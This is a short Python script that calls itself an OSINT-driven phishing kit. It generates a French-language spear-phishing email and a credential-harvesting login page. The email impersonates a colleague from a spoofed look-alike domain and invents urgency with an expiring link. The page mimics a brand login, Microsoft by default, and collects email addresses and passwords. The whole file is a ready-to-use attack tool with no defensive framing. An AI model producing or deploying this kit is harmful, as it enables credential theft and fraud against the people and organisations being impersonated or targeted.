# Phishing kit OSINT-driven — email spear-phishing + landing page
# deps: requests bs4
import requests,json
from pathlib import Path
import datetime

def spear_email(t_name,t_email,company,s_name,s_title,url):
    return f"""From: {s_name} <no-reply@{company.lower().replace(' ','')}-secure.com>
To: {t_email}
Subject: [ACTION REQUISE] Document partagé — {company}

Bonjour {t_name},

{s_name} ({s_title} chez {company}) a partagé un document confidentiel.
Validation requise avant le {datetime.date.today().strftime('%d/%m/%Y')}.

→ {url}

Ce lien expire dans 24h.
{s_name} — {s_title}, {company}
"""

def landing(brand,redirect):
    return f"""<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8">
<title>{brand} — Authentification</title>
<style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;align-items:center;
justify-content:center;height:100vh;margin:0}}
.b{{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);width:360px}}
h2{{margin:0 0 24px;text-align:center}}input{{width:100%;padding:10px;margin-bottom:16px;
border:1px solid #ccc;border-radius:6px;box-sizing:border-box}}
button{{width:100%;padding:11px;background:#0078d4;color:#fff;border:none;border-radius:6px;cursor:pointer}}
</style></head><body><div class="b"><h2>🔒 {brand}</h2>
<form method="POST" action="/login">
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Mot de passe" required>
<button>Accéder</button></form></div></body></html>"""

if __name__=="__main__":
    brand  = input("Brand [Microsoft]: ") or "Microsoft"
    t_name = input("Nom cible: ") or "Jean Dupont"
    t_mail = input("Email cible: ") or "cible@example.com"
    co     = input("Entreprise: ") or "Acme"
    url    = input("URL payload: ") or "http://localhost:8080"
    s_name = input("Expéditeur: ") or "Marc Leroy"
    s_ttl  = input("Titre: ") or "IT Manager"
    Path("output/spear_email.txt").write_text(spear_email(t_name,t_mail,co,s_name,s_ttl,url))
    Path("output/phish_landing.html").write_text(landing(brand,"https://microsoft.com"))
    print("[+] output/spear_email.txt  output/phish_landing.html")
    